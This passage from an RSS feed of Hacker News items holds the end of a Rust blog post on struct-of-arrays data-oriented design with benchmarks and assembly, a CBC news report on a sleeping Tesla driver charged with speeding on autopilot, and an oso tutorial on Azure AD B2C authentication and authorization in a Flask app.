        <span>player</span><span>.location</span> <span>=</span> <span>(</span>
            <span>player</span><span>.location</span><span>.</span><span>0</span> <span>+</span> <span>player</span><span>.velocity</span><span>.</span><span>0</span><span>,</span>
            <span>player</span><span>.location</span><span>.</span><span>1</span> <span>+</span> <span>player</span><span>.velocity</span><span>.</span><span>1</span><span>,</span>
        <span>);</span>
        <span>player</span><span>.velocity</span> <span>=</span> <span>(</span>
            <span>player</span><span>.velocity</span><span>.</span><span>0</span> <span>+</span> <span>player</span><span>.acceleration</span><span>.</span><span>0</span><span>,</span>
            <span>player</span><span>.velocity</span><span>.</span><span>1</span> <span>+</span> <span>player</span><span>.acceleration</span><span>.</span><span>1</span><span>,</span>
        <span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This would be the usual object-oriented approach to this problem. The
issue here is that in memory the structs are stored as follows (assuming
no field re-ordering i.e. <code>#[repr(C)]</code>), on a 64-bit architecture each field will be 64
bits (8 bytes, so each Player is 64 bytes):</p>

<div><div><pre><code>-- Vec&lt;Player&gt;
name  (pointer to heap)  -- Player 1
health    
location0  (tuple split for clarity) 
location1
velocity0
velocity1
acceleration0
acceleration1
name  (pointer to heap)  -- Player 2
location0    
location1
velocity0
velocity1
acceleration0
acceleration1
...
</code></pre></div></div>

<p>Note the parts we want to operate on (locations, velocities and
accelerations) are not stored contiguously across different Players.
This prevents us from using vector operations to operate on multiple
players at once (since they cannot be loaded in the same CPU cache
line, usually ~64 bytes).</p>

<p>In contrast, the data-oriented approach is to design around this
limitation and optimise for auto-vectorisation. Instead of using a
struct per Player, we now use one struct for all Players and each Player
has their values stored at their index in the separate attribute Vectors:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>DOPlayers</span> <span>{</span>
    <span>names</span><span>:</span> <span>Vec</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
    <span>health</span><span>:</span> <span>Vec</span><span>&lt;</span><span>f64</span><span>&gt;</span><span>,</span>
    <span>locations</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
    <span>velocities</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
    <span>acceleration</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p>Now we can do the same calculation as in the OOP case as follows:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>run_dop</span><span>(</span><span>world</span><span>:</span> <span>&amp;</span><span>mut</span> <span>DOPlayers</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>pos</span><span>,</span> <span>(</span><span>vel</span><span>,</span> <span>acc</span><span>))</span> <span>in</span> <span>world</span>
        <span>.locations</span>
        <span>.iter_mut</span><span>()</span>
        <span>.zip</span><span>(</span><span>world</span><span>.velocities</span><span>.iter_mut</span><span>()</span><span>.zip</span><span>(</span><span>world</span><span>.acceleration</span><span>.iter</span><span>()))</span>
    <span>{</span>
        <span>*</span><span>pos</span> <span>=</span> <span>(</span><span>pos</span><span>.</span><span>0</span> <span>+</span> <span>vel</span><span>.</span><span>0</span><span>,</span> <span>pos</span><span>.</span><span>1</span> <span>+</span> <span>vel</span><span>.</span><span>1</span><span>);</span>
        <span>*</span><span>vel</span> <span>=</span> <span>(</span><span>vel</span><span>.</span><span>0</span> <span>+</span> <span>acc</span><span>.</span><span>0</span><span>,</span> <span>vel</span><span>.</span><span>1</span> <span>+</span> <span>acc</span><span>.</span><span>1</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In this case the memory layout is as follows:</p>
<div><div><pre><code>-- DOPlayers
name1    -- names
name2
...
health1    -- health
health2
...
location1    -- locations
location2
...
</code></pre></div></div>

<p>The relevant fields are now stored contiguously. Given that each
location tuple will be 16 bytes, we could now feasibly load 4 location
tuples on the same cache line to operate on them simultaneously with
SIMD instructions.</p>

<h3 id="benchmark">Benchmark</h3>

<p>Here are the results of the criterion benchmark for the above code (the
full code and benchmark code is available <a href="https://github.com/jamesmcm/data-oriented-example">in the Github repo</a>):</p>

<p><img src="https://jamesmcm.github.io/images/soa.svg" alt="AoS vs. SoA benchmark" title="AoS vs. SoA benchmark"></p>

<p>Overall, we see that the data-oriented approach finishes in half the
time. This would seem to be due to the data-oriented case operating on
two Players at a time - we can confirm this by reviewing the compiled
assembly.</p>

<p>Reviewing the <a href="https://godbolt.org/z/d8bjMb">output on Godbolt</a> we see the following:</p>

<pre><code>// Relevant OOP loop
.LBB0_2:
        movupd  xmm0, xmmword ptr [rax + rdx + 32]
        movupd  xmm1, xmmword ptr [rax + rdx + 48]
        movupd  xmm2, xmmword ptr [rax + rdx + 64]
        addpd   xmm0, xmm1
        movupd  xmmword ptr [rax + rdx + 32], xmm0
        addpd   xmm2, xmm1
        movupd  xmmword ptr [rax + rdx + 48], xmm2
        add     rdx, 80
        cmp     rcx, rdx
        jne     .LBB0_2

// ...
// Relevant DOP loop
.LBB1_7:
        movupd  xmm0, xmmword ptr [rcx + rdx - 16]
        movupd  xmm1, xmmword ptr [rax + rdx - 16]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rcx + rdx - 16], xmm1
        movupd  xmm0, xmmword ptr [r9 + rdx - 16]
        movupd  xmm1, xmmword ptr [rax + rdx - 16]
        addpd   xmm1, xmm0
        movupd  xmm0, xmmword ptr [rax + rdx]
        movupd  xmmword ptr [rax + rdx - 16], xmm1
        add     rdi, 2
        movupd  xmm1, xmmword ptr [rcx + rdx]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rcx + rdx], xmm1
        movupd  xmm0, xmmword ptr [rax + rdx]
        movupd  xmm1, xmmword ptr [r9 + rdx]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rax + rdx], xmm1
        add     rdx, 32
        cmp     rsi, rdi
        jne     .LBB1_7
        test    r8, r8
        je      .LBB1_5
</code></pre>

<p>We can see in the data-oriented case, the loop is unrolled to operate on
two elements at once - resulting in the 50% speed up overall!</p>

<p><strong>Addendum</strong>: As noted by <a href="https://www.reddit.com/r/rust/comments/hxqwom/an_introduction_to_data_oriented_design_with_rust/fz8lxcq/">/u/five9a2 on Reddit</a>
the above output is specifically for the default target, which is
misleading since <code>cargo bench</code> uses the native target by default (i.e.
all possible features on your CPU), so our benchmarks are not using the
above assembly code.</p>

<p>By setting the compiler flag to <code>-C target-cpu=skylake-avx512</code> to enable 
Skylake features, we get the <a href="https://godbolt.org/z/PEPdvn">following output</a>:</p>

<pre><code>// OOP loop
.LBB0_2:
        vmovupd ymm0, ymmword ptr [rax + rdx + 32]
        vaddpd  ymm0, ymm0, ymmword ptr [rax + rdx + 48]
        vmovupd ymmword ptr [rax + rdx + 32], ymm0
        add     rdx, 80
        cmp     rcx, rdx
        jne     .LBB0_2

...
// DOP loop
.LBB1_19:
        vmovupd zmm0, zmmword ptr [rsi + 4*rax - 64]
        vaddpd  zmm0, zmm0, zmmword ptr [rcx + 4*rax - 64]
        vmovupd zmmword ptr [rsi + 4*rax - 64], zmm0
        vmovupd zmm0, zmmword ptr [rcx + 4*rax - 64]
        vaddpd  zmm0, zmm0, zmmword ptr [r10 + 4*rax - 64]
        vmovupd zmmword ptr [rcx + 4*rax - 64], zmm0
        vmovupd zmm0, zmmword ptr [rsi + 4*rax]
        vaddpd  zmm0, zmm0, zmmword ptr [rcx + 4*rax]
        vmovupd zmmword ptr [rsi + 4*rax], zmm0
        vmovupd zmm0, zmmword ptr [rcx + 4*rax]
        vaddpd  zmm0, zmm0, zmmword ptr [r10 + 4*rax]
        vmovupd zmmword ptr [rcx + 4*rax], zmm0
        add     r11, 8
        add     rax, 32
        add     rdi, 2
        jne     .LBB1_19
        test    r9, r9
        je      .LBB1_22
</code></pre>

<p>Here we see the OOP loop making use of the 256-bit ymm registers for the
position tuple and velocity tuple, and another for the velocity tuple
and acceleration tuple. This is possible because they are adjacent in
memory (due to the ordering of the fields). In the DOP loop,
the 512-bit zmm register is used.</p>

<p>It seems the performance differences comes from the bandwidth between
cache levels, since the performance is identical for the small examples.
This can be demonstrated further by removing the extra fields from the
struct - in this case we see only a 25% performance difference (<a href="https://godbolt.org/z/Th91Wa">godbolt
link</a>), and this
corresponds to Player struct now being 384 bits (and so 1/4 of the
512-bit read/write is unused).</p>

<p>This emphasises how important it is to consider your deployment target,
and if deploying performance-sensitive code, to consider setting the
target-cpu explicitly to benefit from all of its features.</p>

<p>It also demonstrates how the ordering of fields can be important to
performance. By default Rust will re-order fields automatically, but you can set
<code>#[repr(C)]</code> to disable this (necessary for C interoperability for
example).</p>

<h3 id="summary">Summary</h3>

<p>This example demonstrates the importance of considering memory layout
when aiming for performant code and auto-vectorisation.</p>

<p>Note that the same logic can also apply when working with arrays of
structs - making your struct smaller will allow you to load more
elements on the same cache line and possibly lead to autovectorisation.
<a href="https://github.com/Rene-007/flake_growth/blob/master/src/helpers.rs">Here is an example</a> of
a crate (which was shared on the <a href="https://www.reddit.com/r/rust/comments/hmqjvs/growing_gold_with_rust/">Rust subreddit</a>) that achieved a 40% performance
improvement by doing just that.</p>

<p>This particular re-organisation has a direct analogue in database design. A
major difference between databases aimed at transactional (OLTP)
workloads and analytical (OLAP) workloads is that the latter tend to use
columnar-based storage. Just like the case above, this means that
operations on one column can take advantage of the contiguous storage
and use vector operations, which tends to be the main access pattern for
analytical workloads (e.g. calculate the average purchase size across all rows,
rather than updating and retrieving entire, specific rows).</p>

<p>In the case of analytical databases this is actually a double win, since it also
applies to the serialisation of the data to disk, where compression can
now be applied along the column (where the data is guaranteed to be of the
same type) leading to much better compression ratios.</p>

<p>If you are working on a problem that might benefit from the struct of
arrays approach, and want to run a quick benchmark, you might be
interested in the <a href="https://github.com/lumol-org/soa-derive">soa-derive</a>
crate that will allow you to derive the struct of arrays from your
struct.</p>

<h2 id="branching-in-a-hot-loop">Branching in a hot loop</h2>

<p>Another optimisation tactic is to avoid branching in any “hot” parts of
the code (i.e. any part that will be executed many, many times).</p>

<p>Branching can arise in subtle ways, often by trying to use one struct for many
different cases. For example, we might define some general Node type …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jamesmcm.github.io/blog/2020/07/25/intro-dod/">https://jamesmcm.github.io/blog/2020/07/25/intro-dod/</a></em></p>]]>
            </description>
            <link>https://jamesmcm.github.io/blog/2020/07/25/intro-dod/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506744</guid>
            <pubDate>Thu, 17 Sep 2020 16:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speeding Tesla driver caught napping behind the wheel on Alberta highway]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24506649">thread link</a>) | @mtr
<br/>
September 17, 2020 | https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A 20-year-old B.C. motorist who who found reclining behind the wheel of a Tesla while the electric vehicle was on autopilot has been charged by the RCMP in Alberta with speeding.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5727840.1600356254!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/tesla-speeding-alberta.JPG"></p></div><figcaption>The 20-year-old B.C. driver of this Tesla Model S has been charged with speeding and dangerous driving, a criminal offence. The incident occurred on July 9 on Highway 2 near Ponoka, about 100 kilometres south of Edmonton.<!-- --> <!-- -->(Alberta RCMP)</figcaption></figure><p><span><p>The RCMP&nbsp;in Alberta have charged a&nbsp;20-year-old British Columbia man with&nbsp;speeding while he was asleep at the wheel of a Tesla electric car.</p>  <p>The RCMP&nbsp;received&nbsp;a call at about&nbsp;4 p.m. on July 9 concerning&nbsp;a 2019 Tesla Model S speeding south on Highway 2 near Ponoka, about 100&nbsp;kilometres south of Edmonton.</p>  <p>Both front seats were fully&nbsp;reclined, and both the driver and passenger&nbsp;appeared to be sound asleep, police say.&nbsp;</p>  <p>The car appeared to be driving on&nbsp;autopilot at more than 140 km/h, RCMP&nbsp;Sgt. Darrin Turnbull&nbsp;told CBC News on Thursday. The speed limit on that stretch of highway is 110 km/h.</p>  <p>"Nobody was looking out the windshield to see where the car was going," he&nbsp;said.&nbsp;</p>  <p>"I've been in policing for over 23 years&nbsp;and the&nbsp;majority of that in traffic&nbsp;law enforcement, and I'm speechless.</p>  <p>"I've never, ever seen anything like this before, but of course the technology wasn't there."&nbsp;</p>  <p>Tesla Model S sedans have autopilot functions, including auto-steer and "traffic-aware" cruise control, and both functions appeared to be activated.</p>  <p>"We believe the vehicle&nbsp;was operating on the autopilot system, which is really just an advanced driver safety system, a driver assist program. You still need to be driving the vehicle," Turnbull said.&nbsp;</p>  <p>"But of course, there are after-market things that can be done to a vehicle against the manufacturer's recommendations to change or circumvent the safety system."&nbsp;</p>  <p>After the responding officer activated emergency lights on their vehicle, the Tesla automatically began to accelerate, Turnbull said, even as those vehicles that were ahead of the Tesla on the highway moved out of the way.</p>  <p>"Nobody appeared to be in the car, but the vehicle sped up because the line was clear in front."</p>  <ul>  </ul>  <p>The responding officer obtained radar readings on the vehicle, confirming that it had automatically accelerated to exactly 150 km/h.</p>  <p>The RCMP charged the driver with speeding and issued a 24-hour licence suspension for fatigue.&nbsp;</p>  <p>After further investigation and consultation with the Crown, a Criminal Code charge of dangerous driving was laid against the driver, police said.</p>  <p>The driver was served with a summons for court in December.</p>  <ul>   <li><strong><a href="https://www.cbc.ca/news/business/tesla-s-self-driving-autopilot-system-under-scrutiny-1.5413931" target="_blank">Tesla's self-driving Autopilot system under scrutiny after 3 deadly crashes</a></strong></li>   <li><strong><a href="https://www.cbc.ca/news/canada/british-columbia/driverless-tesla-richmond-b-c-1.5349855" target="_blank">Driverless Tesla coasting along mall parking lot raises questions, causes confusion</a></strong></li>  </ul>  <p>Autonomous cars are in their early stages in much of Canada, with Ontario and Quebec approving pilot projects as long as a vigilant driver is present to take control of the vehicle when needed.</p>  <p>There have not been any reported self-driving car crashes in Canada, but several have been reported in the United States, putting Tesla's autopilot driving system functions&nbsp;under scrutiny.</p>  <p>On Dec. 29, 2019, a Tesla Model S sedan left a freeway in Gardena, Calif., at high speed, ran a red light and struck a Honda Civic, killing two people inside, police said. On the same day, a Tesla Model 3 hit a parked firetruck on an Indiana freeway, killing a passenger in the Tesla.</p>  <p>On Dec. 7, a Model 3 struck a police cruiser on a Connecticut highway, but&nbsp;no one was hurt.</p>  <p>Tesla's autopilot function is designed to keep a car in its lane and at a safe distance from other vehicles. Autopilot also can change lanes on its own.</p>  <ul>  </ul>  <h2>'It&nbsp;gives all of us a bad name'</h2>  <p>Angie Dean, president of the Tesla Owners Club of Alberta, said the incident is troubling for the 300 paying members of her group&nbsp;and the more than 1,000 active members of the club's online Facebook group.&nbsp;</p>  <p>Dean said the driver-assist functions in Tesla vehicles are designed to enhance safety, not detract from it.</p>  <p>"This type of story is sort of next to&nbsp;a worst-case scenario," she&nbsp;said. "The only thing that would be worse than this is if someone had got hurt.&nbsp;Everyone that I've spoken with is just so disappointed and so frustrated because it's abuse of the system.</p>  <p>"It&nbsp;gives all of us a bad name, and the vast majority of us would never do something like this. We bought these cars because we want to be safer."</p>  <p>The driver-assist program&nbsp;requires&nbsp;regular input from the driver to function,&nbsp;Dean said. If the driver's hands come off the wheel, warnings begin going off every 15 seconds, she said.</p>  <p>"It asks you to put your hands on the wheel&nbsp;and&nbsp;turn it a little bit so that it knows that your hands are on the wheel," Dean said.&nbsp;</p>  <p>"If you don't, it starts beeping at you. And if you still don't, it gets even louder. And&nbsp;if you still don't, it actually turns the hazard lights on, slows the vehicle down and it pulls it over. It turns the car off and autopilot will not engage for the rest of that drive."</p>  <p><strong><em>WATCH | Is the technology behind driverless cars ready for the road?</em></strong></p>  <p><span><span><span></span><span>The technology behind self-driving cars is available and in use, but there are examples showing it may not be fully ready for the real world.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Despite the built-in safeguards, videos&nbsp;circulating online instruct drivers on ways to "hack" and override&nbsp;these systems, Dean&nbsp;said.</p>  <p>"There are a lot of systems that are in place that are really, really trying not to make this possible. But if there's a will, there's a way, I suppose. "&nbsp;</p>  <p>Just because some vehicles can drive themselves, it doesn't mean they should, the RCMP said.&nbsp;</p>  <p>&nbsp;"Although manufacturers of new vehicles have built in safeguards to prevent drivers from taking advantage of the new safety systems in vehicles, those systems are just that — supplemental safety systems," said Supt. Gary Graham of Alberta RCMP Traffic Services.&nbsp;</p>  <p>"They are not self-driving systems, they still come with the responsibility of driving."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506649</guid>
            <pubDate>Thu, 17 Sep 2020 16:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding Auth to a Flask App with Azure Active Directory and Oso]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24506252">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.osohq.com/post/oso-azure | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/oso-azure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Securing application resources usually consists of two security processes: authentication and authorization. <em>Authentication</em> determines the identity of a user, and is often accomplished by some kind of sign-in process. <em>Authorization</em> determines whether or not a user is allowed to access a resource, typically based on their authenticated identity but often based on other factors as well, like having a certain role, being in a group, having specific attributes or meeting other criteria relevant to the use case.</p>
<p>A common authentication pattern involves the application exchanging information with an <em>Identity Provider,</em> or "IdP", to confirm the identity of the user. Well-known IdPs include Facebook, Google, and GitHub.</p>
<p>This post will show how to add authentication and authorization to a simple Flask app, using Azure Active Directory B2C as an IdP, and oso's <code>oso-flask</code> library to authorize requests.</p>
<h3>Summary of what we'll cover:</h3>
<ul>
<li>Sign in users with Azure AD B2C</li>
<li>Use oso to restrict access to signed-in users</li>
<li>Add custom user attributes to our user profile</li>
<li>Write a policy to control access based on user attributes, like job title or team</li>
<li>Access Microsoft user data, like groups and managers, with the Graph API</li>
<li>Write an oso policy to implement role-based access control using Microsoft groups</li>
</ul>
<h3><strong>Background</strong></h3>
<p>This post uses an example application that's written in Python with Flask. You can find the source code <a href="https://github.com/osohq/oso-azure-ad-example">here</a>.</p>
<p><strong>Azure Active Directory</strong> ("AD") is Microsoft's cloud-based identity management service. We'll use it to sign in users and store user data. This example uses a newer variant of Active Directory called "<a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/overview">B2C</a>", which is designed for business-to-consumer apps to manage customer identities.</p>
<p><strong>oso</strong> is an open-source policy engine for authorization that is embedded in your application. We'll use oso to authorize user access to our application's resources. Since our example application uses Flask, we're using the <code>oso-flask</code> <a href="https://docs.osohq.com/using/frameworks/flask.html">integration</a>, which includes middleware for authorizing Flask requests.</p>
<p>The example we'll use in this post is a very simple application that stores and displays documents. Its authorization model is as follows:</p>
<ul>
<li>Users can always view documents that they are the owner of</li>
<li>Documents can belong to user groups</li>
<li>Public documents can be viewed by anyone</li>
<li>Private documents can only be viewed by users that belong to one of the document's groups</li>
</ul>
<h2>Authentication with Azure AD B2C</h2>
<p>We used a <a href="https://github.com/Azure-Samples/ms-identity-python-webapp">sample app</a> provided by Microsoft as the starting point for our example. Following Microsoft's <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-web-app-python?tabs=app-reg-ga">tutorial</a> on setting up authentication in their sample application will get you to the same starting point (you may have to complete a few prerequisite steps as well).</p>
<p>By the end of the tutorial, you should have <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-register-applications?tabs=app-reg-ga">registered the application</a> with your Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-create-tenant">B2C tenant</a>. We've registered ours as "python-webapp":</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled.png"></p>
<p>You should also have set up several <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-create-user-flows">User Flows</a> in the Azure portal for signing in, profile editing, and logging out:</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%201.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%201.png"></p>
<p>When you set up the user flows, make sure that you check the following boxes in "User Attributes" and "Application Claims":</p>
<ul>
<li>Email</li>
<li>Given name</li>
<li>Surname</li>
<li>Display Name</li>
<li>Job Title</li>
<li>Object ID (Application Claims only)</li>
</ul>
<p>Once you've reached the end of the tutorial, your app should be able to sign users in with an email and password, allow them to edit their profile, and log them out. Each of these user flows should return an <code>id_token</code> JWT to your app's redirect handler that stores the above attributes as claims. If you use Microsoft's provided JWT decoder, <a href="https://jwt.ms/">https://jwt.ms</a>, to test your user flow, you should see something like this:</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%202.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%202.png"></p>
<p>Once you've completed the tutorial, the application can be run with the following command from the root directory:</p>
<pre><code>flask run --host localhost --port 5000
</code></pre>

<p>If you'd like to run our <a href="https://github.com/osohq/oso-azure-ad-example">sample application</a>, make sure to update the information in <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/app_config.py#L3-L17">app_config.py</a>:</p>
<pre><code># app_config.py

b2c_tenant = "your-tenant-name"
signupsignin_user_flow = "B2C_1_signupsignin1"
editprofile_user_flow = "B2C_1_profileediting1"
resetpassword_user_flow = "B2C_1_passwordreset1"
authority_template = (
    "https://{tenant}.b2clogin.com/{tenant}.onmicrosoft.com/{user_flow}"
)

CLIENT_ID = (
    "Enter_the_Application_Id_here"  # Application (client) ID of app registration
)

CLIENT_SECRET = (
    "Enter_the_Client_Secret_Here"  # Placeholder - for use ONLY during testing.
)
</code></pre>

<h3>Creating the User model</h3>
<p>Microsoft's sample app stores a raw dictionary of the <code>id_token</code> claims globally in <code>session["user"]</code>. In our app, we created a User <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/user.py#L13-L20">class</a> to store the user data, which we'll add to later on:</p>
<pre><code># user.py

class User:
    def __init__(self, id_token_claims):
        self.id = id_token_claims.get("oid")
        self.display_name = id_token_claims.get("name")
        self.first_name = id_token_claims.get("given_name")
        self.surname = id_token_claims.get("family_name")
        self.emails = id_token_claims.get("emails")
        self.job_title = id_token_claims.get("jobTitle")
</code></pre>

<p>In <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/app.py#L60-L61">our redirect handler</a>, we construct an instance of the current <code>User</code> from the <code>id_token_claims</code> dictionary, and store it on the <code>session</code> object:</p>
<pre><code># app.py

@app.route(app_config.REDIRECT_PATH)
def authorized():
    # ...
    user = User(id_token_result.get("id_token_claims"))
    session["user"] = user
</code></pre>

<p>We've successfully added authentication to our app. Now let's use oso to authorize our authenticated users' requests.</p>
<h2>Adding oso</h2>
<p>Since we're building a Flask app, we're going to use the <code>flask-oso</code> package to add oso to our application. <code>flask-oso</code> is an even lighter weight form of the <code>oso</code> package that provides convenient middleware for authorizing Flask requests. You can find a helpful guide to using <code>flask-oso</code> in our <a href="https://docs.osohq.com/using/frameworks/flask.html">docs</a>.</p>
<p>We followed three steps to add oso to the application:</p>
<ol>
<li>Create a <code>.polar</code> policy file</li>
<li>Initialize the global oso instance by loading the policy and registering relevant application classes</li>
<li>Add calls to <code>flask_oso.FlaskOso.authorize()</code> at authorization enforcement points</li>
</ol>
<h3>Writing a policy</h3>
<p>oso policies are written in a declarative policy language called Polar, and are stored in files with the <code>.polar</code> extension. Take a look at <a href="https://docs.osohq.com/getting-started/policies/index.html">Writing Policie</a>s for an overview of how to use oso policies.</p>
<p>The policy file in this example is called <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/authorization.polar#L1-L3">authorization.polar</a>. We started with a simple rule to allow any logged-in user to get a public document:</p>
<pre><code># authorization.polar

# allow anyone to get public documents
allow(_actor: User, "GET", doc: Document) if
    not doc.is_private;
</code></pre>

<p>This rule works by specializing the <code>_actor</code> on the <code>User</code> class, which means that only actors of type <code>User</code> are allowed to take any action on any resource. Since <code>get_current_user()</code>, which is used to get the default actor, returns <code>None</code> when the current user is not logged in, the rule only applies when the current user is authenticated. The <code>doc</code> argument is specialized on the <code>Document</code> class, which allows us to safely access the <code>is_private</code> field.</p>
<h3>Initializing oso</h3>
<p>We wrote a function called <code>init_oso()</code>, which we put in a file called <a href="https://github.com/osohq/oso-azure-ad-example/blob/master/oso_auth.py">oso_auth.py</a>:</p>
<pre><code># oso_auth.py

from oso import Oso
from flask_oso import FlaskOso

from document import Document
import user
from user import User

def init_oso(app):
    """ set up the `Oso` and `FlaskOso` objects, and add them to the global `app` instance."""
    oso = Oso()
    oso.register_class(Document)
    oso.register_class(User)
    oso.load_file("authorization.polar")

    flask_oso = FlaskOso(app=app, oso=oso)
    flask_oso.set_get_actor(user.get_current_user)

    app.oso = oso
    app.flask_oso = flask_oso
</code></pre>

<p>The <code>init_oso()</code> function creates an <code>Oso</code> instance, on which it registers the <code>User</code> class and the <code>Document</code> class that represents the app's document resources (registering Python classes with oso lets us reference them in our oso policies).</p>
<p>The function then uses the <code>Oso</code> instance to create the <code>FlaskOso</code> instance that we'll use to authorize requests. We call the <code>set_get_actor()</code> method to set the default actor to the current user. This default is used when we make calls to <code>flask_oso.authorize()</code> later on. The <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/user.py#L56-L57">method</a> we pass in, <code>get_current_user()</code> looks up the user on the session object:</p>
<pre><code># user.py

from flask import session

def get_current_user():
    return session.get("user")
</code></pre>

<h3>Authorizing requests</h3>
<p>We're now ready to use the oso library to authorize requests. In this example application, the resources we want to secure are documents, represented by the <code>Document</code> <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/document.py#L11-L46">class</a> in <code>document.py</code>:</p>
<pre><code># document.py

@dataclass
class Document:
    id: int
    owner_id: str
    groups: list
    is_private: bool
    content: str

def find_by_id(id):
    return DOCUMENTS.get(id)

DOCUMENTS = {
    1: Document(
        id=1,
        owner_id="5890e32a-c2ac-4aa0-902d-0717017d1bc3",
        groups=["engineering"],
        is_private=True,
        content="This is a private engineering doc.",
    ),
    2: Document(
        id=2,
        owner_id="273dd85f-0728-44c0-8588-c130f39c900b",
        groups=["marketing"],
        is_private=True,
        content="This is a private marketing doc.",
    ),
    3: Document(
        id=3,
        owner_id="273dd85f-0728-44c0-8588-c130f39c900b",
        groups=["admin"],
        is_private=False,
        content="This is a public admin doc.",
    ),
}
</code></pre>

<p>For this example we've simply hardcoded the document data, but this data would normally be stored in a database.</p>
<p><code>document.py</code> has a <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/document.py#L55-L59">route</a> for viewing the documents, to which we've added a call to <code>flask_oso.FlaskOso.authorize()</code>:</p>
<pre><code># document.py

@bp.route("/docs/&lt;int:id&gt;", methods=["GET"])
def get_doc(id):
    doc = find_by_id(id)
    current_app.flask_oso.authorize(resource=doc)
    return str(doc)
</code></pre>

<p>The <code>authorize()</code> method accepts the same arguments as the <code>is_allowed()</code> method of the <code>oso</code> package (actor, action, and resource), but provides sensible defaults for working with Flask. With our call to <code>set_get_actor()</code>, we set the default actor to the current user. The action defaults to the method of the current request, <code>flask.request.method</code>. We have to provide the resource we want to authorize; in this case, we pass in the <code>Document</code> instance that is being …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.osohq.com/post/oso-azure">https://www.osohq.com/post/oso-azure</a></em></p>]]>
            </description>
            <link>https://www.osohq.com/post/oso-azure</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506252</guid>
            <pubDate>Thu, 17 Sep 2020 15:59:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thinking Clearly About Correlations and Causation (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24506243">thread link</a>) | @Anon84
<br/>
September 17, 2020 | https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true | <a href="https://web.archive.org/web/*/https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
